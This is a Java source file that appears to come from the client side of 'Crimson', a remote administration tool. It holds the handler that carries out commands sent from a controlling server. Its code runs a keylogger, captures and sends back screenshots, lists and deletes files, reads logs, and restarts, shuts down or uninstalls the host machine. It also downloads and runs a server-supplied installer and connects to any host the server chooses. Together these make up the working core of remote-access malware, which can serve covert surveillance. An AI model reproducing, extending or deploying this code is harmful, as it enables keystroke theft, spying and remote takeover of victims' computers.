/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.net;

import static com.subterranean_security.crimson.universal.Flags.LOG_NET;

import java.awt.HeadlessException;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.ConnectException;

import javax.imageio.ImageIO;
import javax.security.auth.DestroyFailedException;

import org.jnativehook.NativeHookException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.protobuf.ByteString;
import com.subterranean_security.crimson.client.Client;
import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.modules.Power;
import com.subterranean_security.crimson.client.modules.QuickScreenshot;
import com.subterranean_security.crimson.client.net.stream.CInfoSlave;
import com.subterranean_security.crimson.client.store.ConfigStore;
import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
import com.subterranean_security.crimson.core.misc.HCP;
import com.subterranean_security.crimson.core.net.Connector;
import com.subterranean_security.crimson.core.net.Connector.Config;
import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
import com.subterranean_security.crimson.core.net.MessageFuture.MessageTimeout;
import com.subterranean_security.crimson.core.net.executor.BasicExecutor;
import com.subterranean_security.crimson.core.platform.LocalFS;
import com.subterranean_security.crimson.core.platform.Platform;
import com.subterranean_security.crimson.core.store.FileManagerStore;
import com.subterranean_security.crimson.core.store.LcvidStore;
import com.subterranean_security.crimson.core.store.NetworkStore;
import com.subterranean_security.crimson.core.stream.Stream;
import com.subterranean_security.crimson.core.stream.StreamStore;
import com.subterranean_security.crimson.core.stream.remote.RemoteSlave;
import com.subterranean_security.crimson.core.util.CryptoUtil;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.core.util.RandomUtil;
import com.subterranean_security.crimson.core.util.TempUtil;
import com.subterranean_security.crimson.proto.core.Generator.ClientConfig;
import com.subterranean_security.crimson.proto.core.Misc.Outcome;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.MI_GroupChallengeResult;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_GroupChallenge;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RS_GroupChallenge;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientControl.RS_ChangeSetting;
import com.subterranean_security.crimson.proto.core.net.sequences.FileManager.RQ_FileListing;
import com.subterranean_security.crimson.proto.core.net.sequences.FileManager.RS_Delete;
import com.subterranean_security.crimson.proto.core.net.sequences.FileManager.RS_FileHandle;
import com.subterranean_security.crimson.proto.core.net.sequences.FileManager.RS_FileListing;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.State;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogFile;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogType;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.RS_Logs;
import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
import com.subterranean_security.crimson.proto.core.net.sequences.Network.RQ_MakeDirectConnection;
import com.subterranean_security.crimson.proto.core.net.sequences.Screenshot.RS_QuickScreenshot;
import com.subterranean_security.crimson.proto.core.net.sequences.State.RS_ChangeClientState;
import com.subterranean_security.crimson.proto.core.net.sequences.Stream.Param;
import com.subterranean_security.crimson.proto.core.net.sequences.Update.RS_GetClientConfig;
import com.subterranean_security.crimson.sc.Logsystem;

import io.netty.util.ReferenceCountUtil;

public class ClientExecutor extends BasicExecutor {
	private static final Logger log = LoggerFactory.getLogger(ClientExecutor.class);

	public ClientExecutor() {
		super();

		dispatchThread = new Thread(() -> {
			while (!Thread.currentThread().isInterrupted()) {
				Message m;
				try {
					m = connector.msgQueue.take();
				} catch (InterruptedException e) {
					return;
				}

				pool.submit(() -> {
					if (LOG_NET) {
						log.debug("Received: {}", m.toString());
					}

					switch (m.getMsgOneofCase()) {
					case EV_CHAT_MESSAGE:
						ev_chat_message(m);
						break;
					case EV_DEBUG_LOG_EVENT:
						break;
					case EV_ENDPOINT_CLOSED:
						ev_endpoint_closed(m);
						break;
					case EV_KEVENT:
						break;
					case EV_NETWORK_DELTA:
						break;
					case EV_PROFILE_DELTA:
						break;
					case EV_SERVER_PROFILE_DELTA:
						break;
					case EV_STREAM_DATA:
						ev_stream_data(m);
						break;
					case EV_VIEWER_PROFILE_DELTA:
						break;
					case MI_AUTH_REQUEST:
						break;
					case MI_CHALLENGE_RESULT:
						challengeResult_1w(m);
						break;
					case MI_CLOSE_FILE_HANDLE:
						break;
					case MI_DEBUG_KILL:
						break;
					case MI_REPORT:
						break;
					case MI_STREAM_START:
						stream_start_ev(m);
						break;
					case MI_STREAM_STOP:
						stream_stop_ev(m);
						break;
					case MI_TRIGGER_PROFILE_DELTA:
						break;
					case MSGONEOF_NOT_SET:
						break;
					case RQ_ADD_LISTENER:
						break;
					case RQ_ADD_TORRENT:
						rq_add_torrent(m);
						break;
					case RQ_ADD_USER:
						break;
					case RQ_ADVANCED_FILE_INFO:
						rq_advanced_file_info(m);
						break;
					case RQ_CHANGE_CLIENT_STATE:
						rq_change_client_state(m);
						break;
					case RQ_CHANGE_SERVER_STATE:
						break;
					case RQ_CHANGE_SETTING:
						rq_change_setting(m);
						break;
					case RQ_CHAT:
						rq_chat(m);
						break;
					case RQ_CLOUD_USER:
						break;
					case RQ_CREATE_AUTH_METHOD:
						break;
					case RQ_CVID:
						break;
					case RQ_DEBUG_SESSION:
						break;
					case RQ_DELETE:
						rq_delete(m);
						break;
					case RQ_DIRECT_CONNECTION:
						rq_direct_connection(m);
						break;
					case RQ_EDIT_USER:
						break;
					case RQ_FILE_HANDLE:
						rq_file_handle(m);
						break;
					case RQ_FILE_LISTING:
						file_listing_rq(m);
						break;
					case RQ_GENERATE:
						break;
					case RQ_GET_CLIENT_CONFIG:
						rq_get_client_config(m);
						break;
					case RQ_GROUP_CHALLENGE:
						rq_group_challenge(m);
						break;
					case RQ_KEY_UPDATE:
						break;
					case RQ_LOGIN:
						break;
					case RQ_LOGIN_CHALLENGE:
						break;
					case RQ_LOGS:
						rq_logs(m);
						break;
					case RQ_MAKE_DIRECT_CONNECTION:

						break;
					case RQ_PING:
						break;
					case RQ_QUICK_SCREENSHOT:
						rq_quick_screenshot(m);
						break;
					case RQ_REMOVE_AUTH_METHOD:
						break;
					case RQ_REMOVE_LISTENER:
						break;
					case RQ_SERVER_INFO:
						break;
					case RS_ADD_TORRENT:
						break;
					case RS_ADD_USER:
						break;
					case RS_ADVANCED_FILE_INFO:
						break;
					case RS_CHANGE_CLIENT_STATE:
						break;
					case RS_CHANGE_SERVER_STATE:
						break;
					case RS_CHANGE_SETTING:
						break;
					case RS_CHAT:
						break;
					case RS_CLOUD_USER:
						break;
					case RS_CREATE_AUTH_METHOD:
						break;
					case RS_CVID:
						break;
					case RS_DEBUG_SESSION:
						break;
					case RS_DELETE:
						break;
					case RS_DIRECT_CONNECTION:
						break;
					case RS_EDIT_USER:
						break;
					case RS_FILE_HANDLE:
						break;
					case RS_FILE_LISTING:
						break;
					case RS_GENERATE:
						rs_generate(m);
						break;
					case RS_GET_CLIENT_CONFIG:
						break;
					case RS_GROUP_CHALLENGE:
						break;
					case RS_KEY_UPDATE:
						break;
					case RS_LOGIN:
						break;
					case RS_LOGIN_CHALLENGE:
						break;
					case RS_LOGS:
						break;
					case RS_MAKE_DIRECT_CONNECTION:
						break;
					case RS_OUTCOME:
						break;
					case RS_PING:
						break;
					case RS_QUICK_SCREENSHOT:
						break;
					case RS_REMOVE_AUTH_METHOD:
						break;
					case RS_SERVER_INFO:
						break;
					default:
						connector.addNewResponse(m);
						break;

					}

					ReferenceCountUtil.release(m);
				});
			}

		});

	}

	private void rq_direct_connection(Message m) {
		RQ_MakeDirectConnection rq = m.getRqMakeDirectConnection();
		Connector connector = new Connector(getInstanceExecutor());
		try {
			connector.connect(Config.ConnectionType.DATAGRAM, rq.getHost(), rq.getPort());
		} catch (ConnectException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	private void ev_stream_data(Message m) {
		Stream s = StreamStore.getStream(m.getEvStreamData().getStreamID());
		if (s != null) {
			s.received(m);
		}

	}

	private void ev_endpoint_closed(Message m) {
		// remove half-open streams
		StreamStore.removeStreamsByCVID(m.getEvEndpointClosed().getCVID());
	}

	private void ev_chat_message(Message m) {

	}

	private void rq_change_client_state(Message m) {
		log.debug("Received state change request: {}", m.getRqChangeClientState().getNewState().toString());
		Outcome outcome = null;

		switch (m.getRqChangeClientState().getNewState()) {
		case RESTART:
			outcome = Power.restart();
			break;
		case SHUTDOWN:
			outcome = Power.shutdown();
			break;
		case HIBERNATE:
			outcome = Power.hibernate();
			break;
		case STANDBY:
			outcome = Power.standby();
			break;
		case UNINSTALL:
			outcome = Power.uninstall();
			break;
		case RESTART_PROCESS:
			outcome = Power.restartProcess();
			break;
		case KILL:
			outcome = Outcome.newBuilder().setResult(true).build();
			break;

		default:
			return;
		}

		if (outcome != null) {
			connector.write(Message.newBuilder().setId(m.getId()).setRid(m.getSid())
					.setRsChangeClientState(RS_ChangeClientState.newBuilder().setOutcome(outcome)).build());

		}

		if (outcome.getResult()) {
			System.exit(0);
		}

	}

	private void rq_group_challenge(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE1) {
			return;
		}

		AuthenticationGroup group = Client.getGroup();
		final byte[] groupKey = group.getGroupKey();
		try {
			group.destroy();
		} catch (DestroyFailedException e1) {
		}

		String result = CryptoUtil.hashSign(m.getRqGroupChallenge().getMagic(), groupKey);
		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder().setResult(result).build();
		connector.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
	}

	private void challengeResult_1w(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE1) {
			return;
		}
		if (!m.getMiChallengeResult().getResult()) {
			log.debug("Authentication with server failed");
			connector.setState(ConnectionState.CONNECTED);
			return;
		} else {
			connector.setState(ConnectionState.AUTH_STAGE2);
		}

		AuthenticationGroup group = Client.getGroup();
		final byte[] groupKey = group.getGroupKey();
		try {
			group.destroy();
		} catch (DestroyFailedException e1) {
		}

		// Send authentication challenge
		final int id = IDGen.msg();

		final String magic = RandomUtil.randString(64);
		RQ_GroupChallenge rq = RQ_GroupChallenge.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
		connector.write(Message.newBuilder().setId(id).setRqGroupChallenge(rq).build());

		new Thread(new Runnable() {
			public void run() {
				boolean flag = true;
				try {
					Message rs = connector.getResponse(id).get(7000);

					if (rs != null) {
						if (!CryptoUtil.verifyGroupChallenge(magic, groupKey, rs.getRsGroupChallenge().getResult())) {
							log.info("Server challenge failed");
							flag = false;
						}

					} else {
						log.debug("No response to challenge");
						flag = false;
					}
				} catch (InterruptedException e) {
					log.debug("No response to challenge");
					flag = false;
				} catch (MessageTimeout e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				MI_GroupChallengeResult.Builder oneway = MI_GroupChallengeResult.newBuilder().setResult(flag);

				if (flag) {
					connector.setState(ConnectionState.AUTHENTICATED);

					oneway.setPd(Platform.fig());
				} else {
					// TODO handle more
					connector.setState(ConnectionState.CONNECTED);
				}
				connector.write(Message.newBuilder().setId(id).setMiChallengeResult(oneway.build()).build());

			}
		}).start();

	}

	private void file_listing_rq(Message m) {

		RQ_FileListing rq = m.getRqFileListing();
		log.debug("file_listing_rq. fmid: " + rq.getFmid());
		LocalFS lf = FileManagerStore.get(rq.getFmid());
		if (rq.hasUp() && rq.getUp()) {
			lf.up();
		} else if (rq.hasDown()) {
			if (rq.hasFromRoot() && rq.getFromRoot()) {
				lf.setPath(rq.getDown());
			} else {
				lf.down(rq.getDown());
			}

		}
		try {
			NetworkStore.route(Message.newBuilder().setId(m.getId())
					.setRsFileListing(RS_FileListing.newBuilder().setPath(lf.pwd()).addAllListing(lf.list()))
					.setSid(m.getRid()).setRid(m.getSid()));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void rq_file_handle(Message m) {
		log.debug("rq_file_handle");
		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
				.setRsFileHandle(RS_FileHandle.newBuilder().setFmid(FileManagerStore.add(new LocalFS(true, true)))));
	}

	private void rq_advanced_file_info(Message m) {
		log.debug("rq_advance_file_info");
		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
				.setRsAdvancedFileInfo(FileUtil.getInfo(m.getRqAdvancedFileInfo().getFile())));
	}

	private void rq_delete(Message m) {
		log.debug("rq_delete");
		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
				.setRsDelete(RS_Delete.newBuilder().setOutcome(
						FileUtil.deleteAll(m.getRqDelete().getTargetList(), m.getRqDelete().getOverwrite()))));
	}

	private void stream_start_ev(Message m) {
		Param p = m.getMiStreamStart().getParam();
		if (p.hasInfoParam()) {
			StreamStore.addStream(new CInfoSlave(p));
		}
		if (p.hasRemoteParam()) {
			StreamStore.addStream(new RemoteSlave(p));
		}
	}

	private void stream_stop_ev(Message m) {
		StreamStore.removeStreamBySID(m.getMiStreamStop().getStreamID());

	}

	private void rq_get_client_config(Message m) {
		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
				.setRsGetClientConfig(RS_GetClientConfig.newBuilder().setConfig(ConfigStore.getConfig())));
	}

	private void rs_generate(Message m) {
		// TODO flush any pending data

		// update client
		File temp = TempUtil.getDir();
		try {
			FileUtil.writeFile(m.getRsGenerate().getInstaller().toByteArray(),
					new File(temp.getAbsolutePath() + "/installer.jar"));

			HCP.update(new File(temp.getAbsolutePath() + "/installer.jar").getAbsolutePath(), new String[] {},
					new String[] {}, 2);
			System.exit(0);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void rq_quick_screenshot(Message m) {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			ImageIO.write(QuickScreenshot.snap(), "jpg", baos);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		}
		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
				.setRsQuickScreenshot(RS_QuickScreenshot.newBuilder().setBin(ByteString.copyFrom(baos.toByteArray()))));
		try {
			baos.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void rq_logs(Message m) {
		RS_Logs.Builder rs = RS_Logs.newBuilder();
		if (m.getRqLogs().hasLog()) {
			rs.addLog(LogFile.newBuilder().setName(m.getRqLogs().getLog())
					.setLog(Logsystem.getLog(m.getRqLogs().getLog())));
		} else {
			for (LogType lt : Logsystem.getApplicableLogs()) {
				rs.addLog(LogFile.newBuilder().setName(lt).setLog(Logsystem.getLog(lt)));
			}
		}
		NetworkStore
				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid).setRsLogs(rs));
	}

	private void rq_change_setting(Message m) {
		Outcome.Builder outcome = Outcome.newBuilder().setResult(true);
		try {
			if (m.getRqChangeSetting().hasKeyloggerState()) {
				if (m.getRqChangeSetting().getKeyloggerState() == State.ONLINE) {
					try {
						Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
								ConfigStore.getConfig().getKeyloggerFlushValue());
					} catch (HeadlessException e) {
						outcome.setResult(false).setComment("HeadlessException");
						return;
					} catch (NativeHookException e) {
						outcome.setResult(false).setComment(e.getMessage());
						return;
					}
				} else {
					Keylogger.stop();
				}
			}
			if (m.getRqChangeSetting().hasFlushMethod()) {
				ConfigStore.updateConfig(
						ClientConfig.newBuilder().setKeyloggerFlushMethod(m.getRqChangeSetting().getFlushMethod()));
				ConfigStore.saveIC();
			}
			if (m.getRqChangeSetting().hasFlushValue()) {
				ConfigStore.updateConfig(
						ClientConfig.newBuilder().setKeyloggerFlushValue(m.getRqChangeSetting().getFlushValue()));
				ConfigStore.saveIC();
			}
			if (m.getRqChangeSetting().hasFlushMethod() || m.getRqChangeSetting().hasFlushValue()) {
				try {
					Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
							ConfigStore.getConfig().getKeyloggerFlushValue());
				} catch (HeadlessException e) {
					outcome.setResult(false).setComment("HeadlessException");
					return;
				} catch (NativeHookException e) {
					outcome.setResult(false).setComment(e.getMessage());
					return;
				}
			}
		} finally {
			NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
					.setRsChangeSetting(RS_ChangeSetting.newBuilder().setResult(outcome)));
		}

	}

	private void rq_chat(Message m) {
		// TODO handle
	}

	private void rq_add_torrent(Message m) {

	}

}
